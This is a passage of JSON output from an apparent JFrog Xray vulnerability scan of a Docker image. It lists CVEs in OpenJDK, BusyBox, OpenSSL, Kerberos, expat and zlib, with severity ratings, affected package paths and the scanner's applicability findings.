                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Keytool). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Keytool). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35564",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.713Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35564",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-211464",
                    "summary": "A use-after-free in Busybox 1.35-x's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the copyvar function.",
                    "description": "A use-after-free in Busybox 1.35-x's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the copyvar function.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-30065",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "7.8/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-06-01T00:00:00.554Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to denial of service and possibly code execution when processing a crafted awk pattern.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                                "description": "Although a crashing PoC is available, no technical writeup has mentioned if the UaF can be exploited for code execution",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE (ex. through the `system` keyword), without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            }
                        ]
                    },
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-30065",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607992",
                    "summary": "An invalid pointer dereference on read can be triggered when an\napplication tries to check a malformed DSA public key by the\nEVP_PKEY_public_check() function. This will most likely lead\nto an application crash. This function can be called on public\nkeys supplied from untrusted sources which could allow an attacker\nto cause a denial of service attack.\n\nThe TLS implementation in OpenSSL does not call this function\nbut applications might call the function if there are additional\nsecurity requirements imposed by standards such as FIPS 140-3.",
                    "description": "An invalid pointer dereference on read can be triggered when an\napplication tries to check a malformed DSA public key by the\nEVP_PKEY_public_check() function. This will most likely lead\nto an application crash. This function can be called on public\nkeys supplied from untrusted sources which could allow an attacker\nto cause a denial of service attack.\n\nThe TLS implementation in OpenSSL does not call this function\nbut applications might call the function if there are additional\nsecurity requirements imposed by standards such as FIPS 140-3.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0217",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0217",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks whether the vulnerable <code>EVP_PKEY_public_check()</code> function is called.</p>\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>",
                            "evidence": null,
                            "info": "The vulnerable function `EVP_PKEY_public_check` is never called",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0217",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks whether the vulnerable <code>EVP_PKEY_public_check()</code> function is called.</p>\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>",
                            "evidence": null,
                            "info": "The vulnerable function `EVP_PKEY_public_check` is never called",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0217",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0217",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607993",
                    "summary": "A NULL pointer can be dereferenced when signatures are being\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\nalgorithm used for the signature is known to the OpenSSL library but\nthe implementation of the hash algorithm is not available the digest\ninitialization will fail. There is a missing check for the return\nvalue from the initialization function which later leads to invalid\nusage of the digest API most likely leading to a crash.\n\nThe unavailability of an algorithm can be caused by using FIPS\nenabled configuration of providers or more commonly by not loading\nthe legacy provider.\n\nPKCS7 data is processed by the SMIME library calls and also by the\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\nnot call these functions however third party applications would be\naffected if they call these functions to verify signatures on untrusted\ndata.",
                    "description": "A NULL pointer can be dereferenced when signatures are being\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\nalgorithm used for the signature is known to the OpenSSL library but\nthe implementation of the hash algorithm is not available the digest\ninitialization will fail. There is a missing check for the return\nvalue from the initialization function which later leads to invalid\nusage of the digest API most likely leading to a crash.\n\nThe unavailability of an algorithm can be caused by using FIPS\nenabled configuration of providers or more commonly by not loading\nthe legacy provider.\n\nPKCS7 data is processed by the SMIME library calls and also by the\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\nnot call these functions however third party applications would be\naffected if they call these functions to verify signatures on untrusted\ndata.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-0401",
                            "cwe": [
                                "CWE-476"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0401",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks whether at least one of the vulnerable API calls is called:</p>\n<ul>\n<li><code>PKCS7_decrypt</code></li>\n<li><code>PKCS7_dataInit</code></li>\n</ul>\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "cve_id": "CVE-2023-0401",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>When checking ELF files, the scanner checks whether at least one of the vulnerable API calls is called:</p>\n<ul>\n<li><code>PKCS7_decrypt</code></li>\n<li><code>PKCS7_dataInit</code></li>\n</ul>\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libssl1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0401",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:libcrypto1.1:1.1.1k-r0",
                            "vulnerability_id": "CVE-2023-0401",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607880",
                    "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
                    "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can modify the plaintext Extra Count field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-37370",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2024-06-30T00:00:00.474Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:krb5-libs:1.17.2-r0"
                    ],
                    "extended_information": {
                        "short_description": "A design problem in Kerberos 5 may lead to an authentication bypass when parsing crafted GSS wrap tokens.",
                        "full_description": "The `krb5` library is an implementation of the `Kerberos` Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS tokens` are part of the Generic Security Services Application Program Interface (GSS-API) used to provide secure communication between applications. A `GSS wrap token` is essentially a chunk of data that encapsulates encrypted data required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), attackers can craft the plaintext `Extra Count` field of a confidential GSS krb5 wrap token, causing the unwrapped token to appear truncated to the application.\nIn a truncation attack, the attacker somehow craft the message to indicate the message has finished in a way that will prevent the recipient picking up the rest of the message. This kind of attacks may lead to authentication bypass but rely heavily on the attacker ability to MiTM.\n\nThe general structure of a wrap token contains a header which includes the `Extra Count` field and an encrypted part which includes the message.\nA wrap token with a different value of `Extra Count` field between the plaintext and encrypted copies will be erroneously accepted, which allows a message truncation attack.\n\nThe wrap token header structure is similar to:\n```\nTOK_ID      : 2 byte\nFlags       : 1 byte\nFiller      : 1 byte\nExtra Count : 2 byte\nRRC         : 2 byte\n// Data (Encrypted)\n```\n\nTo successfully exploit this vulnerability the attacker will have to override the RRC field and the encrypted data in a way which will cause the receiving application think it got all of the message. This may lead to several issues, from authentication bypass to DoS.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue can be exploited by attackers over the network",
                                "is_positive": false
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The attacker must be able to intercept the communication between the application and the server (performing a man-in-the-middle attack) and be able to modify the token.",
                                "is_positive": true
                            },
                            {
                                "name": "The issue results in a severe impact (such as remote code execution)",
                                "description": "Can lead to an authentication bypass.",
                                "is_positive": false
                            }
                        ]
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:krb5-libs:1.17.2-r0",
                            "cve_id": "CVE-2024-37370",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are being called:</p>\n<ul>\n<li><code>gss_unwrap()</code></li>\n<li><code>gss_unwrap_iov()</code></li>\n<li><code>gss_krb5int_unseal_token_v3()</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:krb5-libs:1.17.2-r0",
                            "vulnerability_id": "CVE-2024-37370",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607990",
                    "summary": "A read buffer overrun can be triggered in X.509 certificate verification,\nspecifically in name constraint checking. Note that this occurs\nafter certificate chain signature verification and requires either a\nCA to have signed the malicious certificate or for the application to\ncontinue certificate verification despite failure to construct a path\nto a trusted issuer.\n\nThe read buffer overrun might result in a crash which could lead to\na denial of service attack. In theory it could also result in the disclosure\nof private memory contents (such as private keys, or sensitive plaintext)\nalthough we are not aware of any working exploit leading to memory\ncontents disclosure as of the time of release of this advisory.\n\nIn a TLS client, this can be triggered by connecting to a malicious\nserver. In a TLS server, this can be triggered if the server requests\nclient authentication and a malicious client connects.",
                    "description": "A read buffer overrun can be triggered in X.509 certificate verification,\nspecifically in name constraint checking. Note that this occurs\nafter certificate chain signature verification and requires either a\nCA to have signed the malicious certificate or for the application to\ncontinue certificate verification despite failure to construct a path\nto a trusted issuer.\n\nThe read buffer overrun might result in a crash which could lead to\na denial of service attack. In theory it could also result in the disclosure\nof private memory contents (such as private keys, or sensitive plaintext)\nalthough we are not aware of any working exploit leading to memory\ncontents disclosure as of the time of release of this advisory.\n\nIn a TLS client, this can be triggered by connecting to a malicious\nserver. In a TLS server, this can be triggered if the server requests\nclient authentication and a malicious client connects.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-4203",
                            "cwe": [
                                "CWE-125"
                            ],
                            "cvss_v3": "4.9/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libcrypto1.1:1.1.1k-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:libssl1.1:1.1.1k-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-4203",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-194157",
                    "summary": "nextScaffoldPart in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "description": "nextScaffoldPart in xmlparse.c in Expat (aka libexpat) before 2.4.3 has an integer overflow.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-22826",
                            "cwe": [
                                "CWE-190"
                            ],
                            "cvss_v2": "6.8/CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
                            "cvss_v3": "8.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2022-01-11T00:00:00.978Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:expat:2.2.8-r0"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "cve_id": "CVE-2022-22826",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether any of the following vulnerable functions are called:</p>\n<ul>\n<li><code>XML_Parse</code></li>\n<li><code>XML_ParseBuffer</code></li>\n</ul>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:expat:2.2.8-r0",
                            "vulnerability_id": "CVE-2022-22826",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-607947",
                    "summary": "zlib before 1.2.12 allows memory corruption when deflating (i.e., when compressing) if the input has many distant matches.",
                    "description": "zlib before 1.2.12 allows memory corruption when deflating (i.e., when compressing) if the input has many distant matches.",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2018-25032",
                            "cwe": [
                                "CWE-787"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2024-07-01T00:00:00.521Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:zlib:1.2.11-r1"
                    ],
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:zlib:1.2.11-r1",
                            "cve_id": "CVE-2018-25032",
                            "scan_status": 1,
                            "applicability": false,
                            "scanner_explanation": "<p>The scanner checks whether the vulnerable function <code>deflateInit2</code> is called.</p>",
                            "evidence": null,
                            "info": "No references to the vulnerable function were found",
                            "details": null
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:zlib:1.2.11-r1",
                            "vulnerability_id": "CVE-2018-25032",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187947",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Swing). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12, 17; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35559",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.111Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2021-35559",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195099",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JAXP). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).",
